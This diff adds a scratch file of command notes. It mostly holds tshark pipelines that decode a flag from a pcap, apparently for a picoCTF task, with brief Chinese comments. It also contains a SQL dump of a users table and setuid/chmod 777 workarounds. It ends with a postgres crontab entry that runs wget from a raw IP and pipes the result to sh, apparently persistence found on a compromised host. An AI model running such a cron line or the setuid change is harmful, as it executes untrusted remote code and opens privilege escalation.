@@ -1,0 +1,46 @@
+tshark -r myNetworkTraffic.pcap -Y 'http' -T fields -e http.file_data | grep pico
+sudo tshark -r myNetworkTraffic.pcap -Y 'http' -T fields -e http.file_data | grep pico
+chmod 777 myNetworkTraffic.pcap
+cp myNetworkTraffic.pcap /tmp/
+
+sudo tshark -r "./myNetworkTraffic.pcap" -Y 'http' -T fields -e http.file_data | grep pico
+sudo strace -e openat tshark -r myNetworkTraffic.pcap -Y 'http' -T fields -e http.file_data |& grep myNetworkTraffic.pcap
+
+ls -l $(which tshark)
+ps aux | grep tshark
+sudo chmod u+s /usr/bin/tshark
+
+tshark -r /tmp/myNetworkTraffic.pcap -Y 'http' -T fields -e http.file_data | grep pico
+
+tshark -r /tmp/myNetworkTraffic.pcap -Y "tcp.len==12" -T fields -e tcp.segment_data | xxd -p -r | base64 -d 2>/dev/null
+
+
+
+cp myNetworkTraffic.pcap /tmp/
+tshark -r /tmp/myNetworkTraffic.pcap -Y "tcp.len==12 || tcp.len==4" \
+  -T fields -e frame.time -e tcp.segment_data | \
+  sort | \
+  awk '{print $NF}' | \
+  xxd -p -r | \
+  base64 -d 2>/dev/null
+
+sort依照時間順序
+接著一樣用 xxd 和 base64 -d 解碼整段資料。
+awk取每行「最後一欄」
+
+
+SELECT * FROM users
+INTO OUTFILE '/tmp/users.csv'
+FIELDS TERMINATED BY ','
+ENCLOSED BY '"'
+LINES TERMINATED BY '\n';
+
+
+sudo crontab -u postgres -l
+
+root@kimochi:~# sudo crontab -u postgres -l
+
+
+sudo crontab -u postgres -l
+
+* * * * * wget -q -O - http://80.64.16.241/pg.sh | sh > /dev/null 2>&1
